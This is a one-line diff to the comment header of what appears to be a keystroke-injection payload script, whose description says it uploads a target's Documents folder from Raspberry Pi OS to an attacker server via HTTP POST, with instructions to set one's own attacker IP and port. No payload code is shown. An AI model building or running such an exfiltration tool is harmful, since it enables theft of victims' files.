@@ -1,6 +1,6 @@
 REM ==================================================================
 REM Author: fierceoj
-REM Description: Upload Documents folder to attacker server
+REM Description: Upload Documents folder to attacker web server
 REM Target: Raspberry Pi OS
 REM Usage: Change attacker IP/URL and port to yours
 REM Usage: Attacker server must be ready to accept HTTP POST requests
